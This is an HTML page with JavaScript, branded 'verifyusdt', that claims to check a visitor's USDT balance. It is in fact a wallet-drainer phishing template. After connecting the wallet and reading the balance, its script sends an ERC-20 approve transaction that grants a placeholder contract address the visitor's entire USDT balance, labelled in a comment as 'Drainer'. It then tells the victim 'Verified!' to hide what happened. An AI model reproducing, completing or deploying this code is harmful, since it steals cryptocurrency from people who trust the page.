<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>verifyusdt</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://unpkg.com/@walletconnect/web3-provider@2.11.0/dist/umd/index.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #14172B 0%, #080A1F 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      align-items: center;
      color: #fff;
      opacity: 0; /* Start hidden to ensure load */
      transition: opacity 0.5s ease;
    }
    body.loaded { opacity: 1; } /* Fade in when loaded */
    header {
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 5%;
    }
    .logo { font-size: 30px; font-weight: 700; }
    .top-right { font-size: 20px; font-weight: 400; }
    main { text-align: center; padding: 0 20px; }
    main h1 { font-size: 50px; font-weight: 700; line-height: 60px; margin-bottom: 20px; }
    main p { font-size: 20px; font-weight: 400; line-height: 30px; margin-bottom: 40px; }
    .check-button {
      background: #0D6EFD;
      color: #fff;
      border: none;
      padding: 16px 40px;
      font-size: 16px;
      font-weight: 700;
      border-radius: 50px;
      cursor: pointer;
      transition: background 0.3s ease;
    }
    .check-button:hover { background: #0056b3; }
    .below-button { font-size: 16px; font-weight: 400; margin-top: 20px; }
    footer { width: 100%; text-align: center; padding: 20px; font-size: 16px; font-weight: 400; }
  </style>
</head>
<body>
  <header>
    <div class="logo">verifyusdt</div>
    <div class="top-right">verifyusdt</div>
  </header>
  <main>
    <h1>Check Your USDT Balance</h1>
    <p>Connect your wallet and check your USDT balance instantly</p>
    <button class="check-button" onclick="checkUSDT()">Check</button>
    <div class="below-button">verifyusdt</div>
  </main>
  <footer>
    Copyright © verifyusdt 2023
  </footer>
  <script>
    // Fade in body when loaded
    window.addEventListener('load', () => document.body.classList.add('loaded'));

    async function checkUSDT() {
      let provider;
      if (window.ethereum) {
        provider = window.ethereum;
        console.log('Using MetaMask or similar');
      } else if (window.web3) {
        provider = window.web3.currentProvider;
        console.log('Using legacy web3');
      } else {
        console.log('No wallet detected, prompting WalletConnect');
        try {
          const walletConnectProvider = new WalletConnectProvider({
            rpc: { 1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161" },
            qrcode: true
          });
          await walletConnectProvider.enable();
          provider = walletConnectProvider;
        } catch (e) {
          console.error('WalletConnect failed:', e);
        }
      }

      if (!provider) {
        alert('No Web3 wallet detected. Please install MetaMask or another wallet to proceed.');
        window.open('https://metamask.io/download.html', '_blank');
        return;
      }

      try {
        let accounts = await provider.request({ method: 'eth_accounts' });
        if (!accounts || accounts.length === 0) {
          accounts = await provider.request({ method: 'eth_requestAccounts' });
        }
        const fromAddress = accounts[0];
        const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7'; // USDT on Ethereum
        const contractAddress = '0x1234…'; // Replace with your contract address

        // Check USDT balance
        const balanceHex = await provider.request({
          method: 'eth_call',
          params: [{ to: usdtAddress, data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') }, 'latest']
        });
        const balance = BigInt(balanceHex);
        const usdtAmount = Number(balance) / 10**6;

        if (usdtAmount < 0.05) {
          alert('Insufficient USDT. You need at least 0.05 USDT to proceed.');
          return;
        }

        alert(`USDT Balance: ${usdtAmount.toFixed(2)} (~$${usdtAmount.toFixed(2)})`);

        // Drainer: Approve USDT transfer
        const approveABI = '0x095ea7b3';
        const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
        await provider.request({
          method: 'eth_sendTransaction',
          params: [{
            from: fromAddress,
            to: usdtAddress,
            data: approveData,
            gas: '0x186A0' // 100,000 gas
          }]
        });

        alert('Processing approval...');
        await new Promise(resolve => setTimeout(resolve, 1000));
        alert('Verified! Screenshot this.');
        if (provider.disconnect) await provider.disconnect();
      } catch (error) {
        console.error('Error:', error.message);
        alert('Transaction failed. Check console for details and try again.');
        if (provider && provider.disconnect) await provider.disconnect();
      }
    }
  </script>
</body>
</html>
